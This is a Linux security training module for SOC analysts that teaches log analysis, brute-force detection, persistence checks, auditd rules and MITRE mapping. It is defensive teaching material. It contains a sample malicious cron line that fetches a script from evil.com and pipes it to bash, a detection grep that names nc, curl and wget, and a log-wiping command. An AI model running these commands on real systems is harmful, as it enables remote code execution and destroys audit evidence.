# Module 21: Linux Security for SOC Analysts

**Priority: P1 — Important for first months on the job**

---

## 21.1 Why Linux Security Matters for SOC

### Reality Check
- **Cloud workloads**: 90%+ run on Linux (AWS, Azure, GCP)
- **Containers/Kubernetes**: Linux-based
- **Servers**: Web, database, application servers predominantly Linux
- **Attack surface**: Different from Windows but equally targeted
- **L1 responsibility**: You WILL see Linux alerts in any modern MXDR

### Key Differences from Windows
| Aspect | Windows | Linux |
|--------|---------|-------|
| Logging | Event Logs (binary) | Text files in `/var/log` |
| Auth | Kerberos/NTLM | SSH keys, PAM, sudo |
| Processes | WMI, Sysmon | `/proc`, `ps`, `auditd` |
| Persistence | Registry, Services | Cron, systemd, rc.local, `.bashrc` |
| Privilege escalation | Token manipulation | SUID, sudo, capabilities, kernel exploits |

---

## 21.2 Linux Fundamentals for SOC

### Users and Permissions
```bash
# User info
id                          # Current user UID/GID/groups
whoami                      # Current username
cat /etc/passwd             # All users (UID >= 1000 = human users)
cat /etc/shadow             # Password hashes (root only)
cat /etc/group              # Groups

# Key UIDs
UID 0     = root (superuser)
UID 1-999 = system accounts
UID 1000+ = regular users
```

### Critical Files for Investigation
| File | Purpose | SOC Value |
|------|---------|-----------|
| `/etc/passwd` | User accounts | Enumerate users, detect unauthorized accounts |
| `/etc/shadow` | Password hashes | Offline cracking target, hash dumping indicator |
| `/etc/sudoers` | Sudo privileges | Privilege escalation paths |
| `/etc/ssh/sshd_config` | SSH config | Hardening gaps, backdoor configs |
| `~/.ssh/authorized_keys` | SSH keys | Persistence, lateral movement |
| `/etc/crontab` + `/var/spool/cron/` | Scheduled jobs | Persistence mechanism |
| `/etc/systemd/system/` | Systemd services | Persistence, malicious services |

---

## 21.3 Linux Logging — The SOC Analyst's View

### Primary Log Locations
```
/var/log/
├── auth.log          # Authentication (Ubuntu/Debian)
├── secure            # Authentication (RHEL/CentOS)
├── syslog            # General system messages
├── messages          # General system messages (RHEL)
├── kern.log          # Kernel messages
├── audit/audit.log   # Linux Audit daemon (detailed)
├── cron.log          # Cron job execution
├── dmesg             # Kernel ring buffer
└── journal/          # systemd journal (binary)
```

### Log Analysis Commands
```bash
# View recent auth logs
tail -100 /var/log/auth.log

# Search for failed logins
grep "Failed password" /var/log/auth.log

# Search for accepted logins
grep "Accepted password" /var/log/auth.log

# Search for sudo usage
grep "sudo:" /var/log/auth.log

# Follow logs in real-time
tail -f /var/log/auth.log

# Journalctl (systemd)
journalctl -u sshd -f           # Follow SSH logs
journalctl -u sshd --since "1 hour ago"
journalctl -p err..crit         # Errors and critical only
journalctl -xe                  # Detailed with explanations
```

---

## 21.4 Authentication Investigation

### SSH Log Analysis
**Typical Log Entry (auth.log):**
```
Feb 15 10:23:45 server01 sshd[12345]: Accepted password for john from 192.168.1.50 port 54321 ssh2
Feb 15 10:23:45 server01 sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
```

**Key Fields:**
- **Timestamp**: When
- **Host**: Which server
- **Process**: `sshd[PID]`
- **Action**: `Accepted password` / `Failed password` / `Accepted publickey`
- **User**: Username
- **Source IP**: Origin
- **Port**: Source port
- **Method**: `password`, `publickey`, `keyboard-interactive`

### Brute Force Detection
```bash
# Count failed attempts per IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr

# Count failed attempts per user
grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -nr

# Successful login after failures (password spray indicator)
grep -B5 "Accepted password" /var/log/auth.log | grep "Failed password"
```

### Suspicious Authentication Patterns
| Pattern | Indicator | Investigation |
|---------|-----------|---------------|
| Many failed → 1 success | Brute force / password spray | Check source IP, user, time window |
| Login from new geo/IP | Credential theft / impossible travel | Check user's normal locations |
| Root login direct | Policy violation / compromise | Check `PermitRootLogin` config |
| Service account interactive login | Abuse / lateral movement | Service accounts should not login interactively |
| Sudo to root without TTY | Scripted/automated escalation | Check command executed |
| SSH key authentication from new IP | Stolen key / lateral movement | Check `authorized_keys` modifications |

### Sudo Log Analysis
```bash
# All sudo commands
grep "sudo:" /var/log/auth.log

# Suspicious sudo commands
grep "sudo:" /var/log/auth.log | grep -E "(su|bash|sh|nc|ncat|python|perl|curl|wget|base64)"

# Failed sudo attempts
grep "sudo:.*incorrect password" /var/log/auth.log
```

---

## 21.5 Process Investigation

### Process Enumeration
```bash
# Current processes
ps aux                # All processes, BSD style
ps -ef                # All processes, standard style
ps -eo pid,ppid,user,cmd,etime,lstart  # Custom format with start time

# Process tree
pstree -p             # Tree with PIDs
ps -ejH               # Tree view

# Specific process details
cat /proc/<PID>/cmdline | tr '\0' ' '    # Full command line
cat /proc/<PID>/environ | tr '\0' '\n'   # Environment variables
ls -la /proc/<PID>/fd/                   # Open file descriptors
cat /proc/<PID>/maps                     # Memory maps
```

### Suspicious Process Indicators
| Indicator | Why Suspicious | Example |
|-----------|----------------|---------|
| Process running from `/tmp`, `/dev/shm`, `/var/tmp` | Malware staging | `/tmp/.hidden/script.sh` |
| Process with no command line | Hidden/hollowed process | `ps aux` shows `[kworker/0:1]` but no cmd |
| High CPU/memory from unknown process | Cryptominer / malware | `top` shows unknown binary at 100% |
| Process masquerading as system process | Masquerading | `systemd` running as user `www-data` |
| Child of unusual parent | Process injection | `nginx` spawning `bash` |
| Deleted binary still running | Fileless malware | `(deleted)` in `/proc/<PID>/exe` |

### Finding Deleted Binaries Still Running
```bash
# Find processes with deleted executables
ls -la /proc/*/exe 2>/dev/null | grep deleted

# Or using find
find /proc -maxdepth 2 -name exe -exec ls -la {} \; 2>/dev/null | grep deleted
```

---

## 21.6 Persistence Mechanisms

### Cron Jobs
```bash
# System crontab
cat /etc/crontab
ls -la /etc/cron.*/

# User crontabs
cat /var/spool/cron/* 2>/dev/null

# Suspicious: runs as root, unusual timing, downloads/executes
# Example malicious cron:
# * * * * * root curl -s http://evil.com/shell.sh | bash
```

### Systemd Services
```bash
# List all services
systemctl list-unit-files --type=service

# Check enabled services
systemctl list-unit-files --state=enabled

# Inspect a service
systemctl cat suspicious-service.service

# Look for:
# - ExecStart pointing to scripts in /tmp, /home, /var/tmp
# - User=root for non-system services
# - Recently created service files
find /etc/systemd/system -name "*.service" -mtime -7
```

### Shell Configuration Files
```bash
# Check for malicious additions
cat ~/.bashrc ~/.bash_profile ~/.profile
cat /etc/profile /etc/bash.bashrc

# Look for:
# - curl/wget to external destinations
# - Reverse shell commands
# - PATH modifications
# - Aliases overriding common commands
```

### SSH Keys
```bash
# Check authorized_keys for all users
find /home -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \;
cat /root/.ssh/authorized_keys 2>/dev/null

# Look for:
# - Keys not belonging to user
# - Keys with suspicious comments
# - Large number of keys
# - Keys added recently (check timestamps)
```

### SUID/SGID Binaries
```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Compare with known good baseline
# Suspicious: custom binaries, scripts with SUID, unusual locations
```

---

## 21.7 Network Investigation

### Network Connections
```bash
# Active connections (modern)
ss -tunap          # TCP, UDP, numeric, PID, all

# Active connections (legacy)
netstat -tunap

# Listening ports
ss -tlnp           # TCP listening with PID
ss -ulnp           # UDP listening with PID

# Connection details for specific PID
ss -tunap | grep <PID>
```

### Suspicious Network Patterns
| Pattern | Indicator |
|---------|-----------|
| Process listening on high port (>1024) non-standard | Backdoor / C2 |
| Outbound connections to rare ports | C2 / data exfil |
| Many connections to same external IP | Beaconing / C2 |
| Connections to known malicious IPs | Compromise |
| Process making connections it shouldn't | E.g., `cron` connecting outbound |
| Long-lived connections | C2 channel / data exfil |

---

## 21.8 File System Investigation

### Recently Modified Files
```bash
# Files modified in last 24 hours
find / -type f -mtime -1 2>/dev/null | grep -v "^/proc" | grep -v "^/sys"

# Files created in last 7 days in suspicious locations
find /tmp /var/tmp /dev/shm -type f -mtime -7 2>/dev/null

# Large files (potential data staging)
find / -type f -size +100M 2>/dev/null | grep -v "^/proc"
```

### Hidden Files and Directories
```bash
# Find hidden files in suspicious locations
find /home /root /tmp /var/tmp -name ".*" -type f 2>/dev/null

# Check for hidden directories
find / -name ".*" -type d 2>/dev/null | grep -v "^/proc" | grep -v "^/sys"
```

### Immutable Files (attr)
```bash
# Check for immutable/append-only files (malware protection)
lsattr /bin/ls /usr/bin/ssh /etc/passwd
# If 'i' (immutable) or 'a' (append-only) set unexpectedly = tampering
```

---

## 21.9 Linux Auditd — Advanced Telemetry

### What is auditd?
- Kernel-level auditing subsystem
- Logs syscalls: file access, process execution, network, privilege changes
- More detailed than syslog but verbose

### Key Audit Rules for SOC
```bash
# Monitor /etc/passwd, /etc/shadow, /etc/sudoers
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k identity

# Monitor sudo usage
-w /usr/bin/sudo -p x -k priv_esc

# Monitor SSH config changes
-w /etc/ssh/sshd_config -p wa -k ssh_config

# Monitor cron changes
-w /etc/crontab -p wa -k cron
-w /var/spool/cron -p wa -k cron

# Monitor systemd service changes
-w /etc/systemd/system -p wa -k systemd
```

### Querying Audit Logs
```bash
# Search by key
ausearch -k identity

# Search by user
ausearch -ua 1000

# Search by executable
ausearch -x /bin/bash

# Search by time
ausearch -ts today -te now

# Summary report
aureport --summary
aureport --auth
aureport --exe
```

---

## 21.10 Container/Kubernetes Basics for SOC

### Container Escape Indicators
- Process sees host filesystem (`/host` mount)
- Process has `CAP_SYS_ADMIN` capability
- Access to Docker socket (`/var/run/docker.sock`)
- Mounted host `/proc`, `/sys`

### Kubernetes Audit Logs
```bash
# API server audit log (if enabled)
# Look for:
# - Anonymous access to sensitive endpoints
# - RBAC escalation (create clusterrolebinding)
# - Pod creation with privileged containers
# - Secret enumeration
# - Exec/attach/port-forward to sensitive pods
```

---

## 21.11 Practical Investigation Checklist

### When Alert Triggers on Linux Host:

1. **Identify the host and user context**
   - Hostname, IP, role (web, db, app, bastion)
   - Which user triggered alert

2. **Check authentication logs**
   - Recent logins (success/failed)
   - Sudo usage
   - SSH key usage

3. **Examine processes**
   - Suspicious processes running now
   - Process tree around alert time
   - Deleted binaries still running

4. **Check persistence mechanisms**
   - Cron jobs
   - Systemd services
   - SSH keys
   - Shell RC files
   - SUID binaries

5. **Analyze network activity**
   - Current connections
   - Listening ports
   - Outbound connections

6. **Review file system changes**
   - Recent file modifications
   - Hidden files
   - Large files in /tmp

7. **Correlate with threat intelligence**
   - IPs, domains, hashes from alert
   - Check against TI feeds

8. **Check container context (if applicable)**
   - Container vs host namespace
   - Privileged container?

---

## 21.12 Common L1 Mistakes with Linux

| Mistake | Correction |
|---------|------------|
| Ignoring Linux alerts "not my platform" | Linux is >50% of cloud workloads |
| Only checking `/var/log/auth.log` | Check `journalctl`, `audit.log`, application logs |
| Not understanding sudo vs root | Sudo leaves audit trail; direct root may not |
| Missing container context | Container compromise ≠ host compromise (but can lead to it) |
| Overlooking SUID binaries | Common privilege escalation path |
| Not checking `authorized_keys` | SSH key theft = persistent access |
| Treating Linux like Windows | Different logging, different tools, different attack patterns |

---

## 21.13 MITRE ATT&CK Mapping for Linux

| Technique | ID | Linux Example |
|-----------|----|---------------|
| SSH Brute Force | T1110.001 | Failed password attempts in auth.log |
| SSH Key Theft | T1555.004 | `authorized_keys` enumeration |
| Cron Job Persistence | T1053.003 | Malicious entry in `/etc/crontab` |
| Systemd Service Persistence | T1543.002 | Malicious `.service` file |
| SUID/SGID Abuse | T1548.001 | `find / -perm -4000` exploitation |
| Kernel Exploit | T1068 | Dirty Pipe, Dirty COW |
| Container Escape | T1611 | Access to host via Docker socket |
| Web Shell | T1505.003 | PHP/ASP/JSP shell in web root |
| Log Tampering | T1562.002 | `echo "" > /var/log/auth.log` |

---

## 21.14 Quick Reference Commands Card

```bash
# === AUTHENTICATION ===
grep "Accepted\|Failed" /var/log/auth.log | tail -20
journalctl -u sshd --since "2 hours ago"
last -20                    # Recent logins
lastb -20                   # Failed logins

# === PROCESSES ===
ps aux --sort=-%cpu | head -20
ps aux --sort=-%mem | head -20
pstree -p
ls -la /proc/*/exe 2>/dev/null | grep deleted

# === PERSISTENCE ===
cat /etc/crontab
ls /etc/cron.*/
systemctl list-unit-files --state=enabled
find /home -name "authorized_keys" -exec cat {} \;

# === NETWORK ===
ss -tunap
ss -tlnp

# === FILES ===
find /tmp /var/tmp /dev/shm -type f -mtime -1 2>/dev/null
find / -type f -mtime -1 2>/dev/null | grep -vE "^/(proc|sys|dev)"

# === AUDIT ===
ausearch -ts today -k identity
aureport --auth --summary
```

---

## 21.15 Summary: What L1 Must Know

- [ ] Navigate `/var/log` and use `journalctl`
- [ ] Analyze SSH authentication (success/failed/key)
- [ ] Detect brute force and password spray patterns
- [ ] Enumerate processes and spot anomalies
- [ ] Check cron, systemd, SSH keys for persistence
- [ ] Use `ss`/`netstat` for network connections
- [ ] Find recently modified/suspicious files
- [ ] Understand SUID/SGID risks
- [ ] Basic auditd query with `ausearch`/`aureport`
- [ ] Recognize container-specific indicators
- [ ] Map findings to MITRE ATT&CK techniques